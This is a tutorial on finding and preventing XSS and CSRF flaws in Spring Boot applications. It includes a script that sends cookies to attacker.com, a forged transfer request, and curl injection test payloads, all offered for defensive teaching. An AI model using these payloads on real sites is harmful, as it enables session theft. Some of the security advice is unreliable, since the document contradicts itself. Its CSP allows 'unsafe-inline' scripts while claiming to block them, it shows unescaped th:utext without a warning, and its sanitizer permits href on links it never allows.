# XSS and CSRF Vulnerabilities in Spring Boot: Detection and Prevention Guide

Your Spring Boot API is production-ready. Security checks? Done. Tests? Green. Then a security audit reveals your application is vulnerable to XSS and CSRF attacks. **Welcome to every developer’s nightmare.** I’ve seen teams deploy “secure” applications that leaked user data within hours because they misunderstood these fundamental vulnerabilities.

Here’s the harsh truth: **Spring Security doesn’t make your application secure by default — it gives you tools, but you still need to use them correctly.** XSS can steal user sessions through a single unescaped input field. CSRF can trick users into performing actions they never intended. Both are in OWASP’s Top 10, and both are preventable with proper Spring Boot configuration.

### Table of Contents
1.  Understanding XSS and CSRF Attacks
2.  Detecting Vulnerabilities in Your Spring Boot Application
3.  Implementing XSS Protection
4.  Implementing CSRF Protection

---

## 1. Understanding XSS and CSRF Attacks

### What is XSS (Cross-Site Scripting)?
XSS allows attackers to inject malicious scripts into web pages viewed by other users. When your application renders user input without proper sanitization, attackers can execute JavaScript in victims’ browsers.

**Real-world example:**
```javascript
// Attacker submits this as their username:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

// Your application renders it:
<div>Welcome, <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script></div>
```
**Result:** Every user who views this profile has their session stolen.

**Types of XSS:**
* **Stored XSS:** Malicious script saved in database, executed for all viewers.
* **Reflected XSS:** Script in URL parameters, executed immediately.
* **DOM-based XSS:** Client-side JavaScript processes untrusted data unsafely.

### What is CSRF (Cross-Site Request Forgery)?
CSRF tricks authenticated users into executing unwanted actions. The attacker crafts a malicious request that piggybacks on the victim’s existing session.

**Real-world example:**
```html
<img src="https://yourbank.com/api/transfer?to=attacker&amount=10000" />
```
When victim (logged into yourbank.com) visits attacker's site, their browser automatically sends their session cookie with the request. The victim thinks they’re viewing an image, but **their browser silently executes a money transfer** using their authenticated session.

### Why Spring Boot Developers Are Vulnerable
```java
// ❌ Common mistake #1: Trusting user input
@PostMapping("/comments")
public String addComment(@RequestParam String text) {
    Comment comment = new Comment(text);
    commentRepository.save(comment);
    return "redirect:/comments"; // XSS vulnerability!
}

// ❌ Common mistake #2: Disabling CSRF for convenience
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf().disable() // NEVER do this in production!
            .build();
    }
}
```

---

## 2. Detecting Vulnerabilities in Your Spring Boot Application

### Detecting XSS Vulnerabilities
**Manual testing:**
```bash
# Test reflected XSS in URL parameters
curl "http://localhost:8080/search?query=<script>alert('XSS')</script>"

# Test stored XSS in form submissions
curl -X POST http://localhost:8080/api/comments \
  -H "Content-Type: application/json" \
  -d '{"text": "<img src=x onerror=alert(\"XSS\")>"}'
```

**Automated scanning with OWASP ZAP:**
```bash
# Install OWASP ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:8080 \
  -r zap-report.html
```

**Code review checklist:**
```java
// ❌ Vulnerable patterns to find:
model.addAttribute("userInput", request.getParameter("input"));
response.getWriter().write(userInput);
return "Welcome " + username; // Direct string concatenation

// ✅ Safe patterns:
model.addAttribute("userInput", htmlEscape(input));
```

### Detecting CSRF Vulnerabilities
**Test CSRF protection:**
```bash
# 1. Login and capture session cookie
SESSION_COOKIE=$(curl -c - http://localhost:8080/login \
  -d "username=user&password=pass" | grep SESSION | awk '{print $7}')

# 2. Try state-changing operation WITHOUT CSRF token
curl -X POST http://localhost:8080/api/transfer \
  -H "Cookie: SESSION=$SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"to": "attacker", "amount": 1000}'
```
**If this succeeds, you have CSRF vulnerability!**

---

## 3. Implementing XSS Protection

### Strategy 1: Output Encoding (Thymeleaf)
Thymeleaf automatically escapes HTML by default:
```html
<div th:text="${userInput}"></div>
<div th:utext="${userInput}"></div>
```

**✅ Safe with explicit sanitization:**
```html
<div th:utext="${@htmlSanitizer.sanitize(userInput)}"></div>
```

**Create HTML sanitizer bean:**
```java
@Component("htmlSanitizer")
public class HtmlSanitizer {
    private final PolicyFactory policy;
    
    public HtmlSanitizer() {
        // Allow only safe HTML tags
        this.policy = new HtmlPolicyBuilder()
            .allowElements("p", "b", "i", "u", "em", "strong", "br")
            .allowAttributes("href").onElements("a")
            .allowStandardUrlProtocols()
            .requireRelNofollowOnLinks()
            .toFactory();
    }
    
    public String sanitize(String untrustedHtml) {
        if (untrustedHtml == null) {
            return "";
        }
        return policy.sanitize(untrustedHtml);
    }
}
```

**Add dependency:**
```xml
<dependency>
    <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
    <artifactId>owasp-java-html-sanitizer</artifactId>
    <version>20220608.1</version>
</dependency>
```

### Strategy 2: Input Validation
```java
@RestController
@RequestMapping("/api/users")
@Validated
public class UserController {
    
    @PostMapping
    public ResponseEntity<User> createUser(
            @Valid @RequestBody UserRequest request) {
        // Validation happens automatically
        User user = userService.create(request);
        return ResponseEntity.ok(user);
    }
}

public class UserRequest {
    @NotBlank(message = "Username is required")
    @Pattern(regexp = "^[a-zA-Z0-9_-]{3,20}$", 
             message = "Username must be alphanumeric, 3-20 characters")
    private String username;
    
    @Email(message = "Invalid email format")
    @NotBlank
    private String email;
    
    @Size(max = 500, message = "Bio too long")
    private String bio;
}
```

### Strategy 3: Content Security Policy (CSP)
```java
@Configuration
public class SecurityHeadersConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' 'unsafe-inline'; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data: https:; " +
                        "font-src 'self'; " +
                        "connect-src 'self'; " +
                        "frame-ancestors 'none';"
                    )
                )
                .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                .frameOptions(frame -> frame.deny())
            )
            .build();
    }
}
```
This configuration:
* Blocks inline scripts unless from your domain.
* Prevents your site from being embedded in iframes.
* Enables browser’s XSS filter.

### Strategy 4: REST API JSON Encoding
```java
@RestController
public class CommentController {
    
    @PostMapping("/api/comments")
    public ResponseEntity<Comment> addComment(@RequestBody CommentRequest request) {
        // Jackson automatically encodes JSON output
        // < becomes \u003c, > becomes \u003e
        Comment comment = new Comment();
        comment.setText(request.getText());
        comment = commentRepository.save(comment);
        
        return ResponseEntity.ok(comment); // Safe: JSON encoded
    }
}
```

---

## 4. Implementing CSRF Protection

### Enable CSRF Protection (Default in Spring Security)
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .ignoringRequestMatchers("/api/public/**") // Public endpoints
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .build();
    }
}
```
**Key configuration:**
* `CookieCsrfTokenRepository.withHttpOnlyFalse()`: Token stored in cookie (accessible to JavaScript).
* `ignoringRequestMatchers()`: Exclude truly public endpoints.

### Frontend Integration (React/Angular)
```javascript
// Axios interceptor to include CSRF token
import axios from 'axios';

// Extract CSRF token from cookie
function getCsrfToken() {
  const match = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
  return match ? match[1] : null;
}
// Add token to all requests
axios.interceptors.request.use(config => {
  const token = getCsrfToken();
  if (token) {
    config.headers['X-XSRF-TOKEN'] = token;
  }
  return config;
});
```

### Thymeleaf Form Integration
```html
<form th:action="@{/api/transfer}" method="post">
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />
    
    <input type="text" name="to" placeholder="Recipient" />
    <input type="number" name="amount" placeholder="Amount" />
    <button type="submit">Transfer</button>
</form>
```

### Testing CSRF Protection
```java
@SpringBootTest
@AutoConfigureMockMvc
class TransferControllerTest {
    
    @Autowired
    private MockMvc mockMvc;
    
    @Test
    @WithMockUser
    void testTransferWithoutCsrfToken_shouldFail() throws Exception {
        mockMvc.perform(post("/api/transfer")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"to\":\"attacker\",\"amount\":1000}"))
            .andExpect(status().isForbidden()); // 403 Forbidden
    }
}
```

### SameSite Cookie Attribute
```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setSameSite("Strict"); // or "Lax"
    serializer.setUseHttpOnlyCookie(true);
    serializer.setUseSecureCookie(true); // HTTPS only
    return serializer;
}
```

### Production Security Checklist
```java
@Configuration
@EnableWebSecurity
public class ProductionSecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            // ✅ CSRF enabled with cookie repository
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            )
            // ✅ Security headers
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
                .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                .frameOptions(frame -> frame.deny())
            )
            // ✅ HTTPS required
            .requiresChannel(channel -> channel
                .anyRequest().requiresSecure()
            )
            // ✅ CORS properly configured
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .build();
    }
}
```

---

## Conclusion
XSS and CSRF aren’t theoretical vulnerabilities — they’re actively exploited in production systems every day. The good news? Spring Boot provides robust tools to prevent both attacks when configured correctly.

**Key takeaways:**
* **XSS Prevention:** Use Thymeleaf’s default HTML escaping, validate inputs, and implement CSP headers.
* **CSRF Prevention:** Keep CSRF protection enabled, use appropriate token repositories for SPAs, and configure SameSite cookie attributes.
* **General Security:** Enable security headers, use HTTPS, and scan with tools like OWASP ZAP.

> Remember: **Security is not a feature you add at the end — it’s a mindset you adopt from day one.** A single XSS vulnerability can compromise your entire user base. A single CSRF weakness can turn users into unwitting accomplices.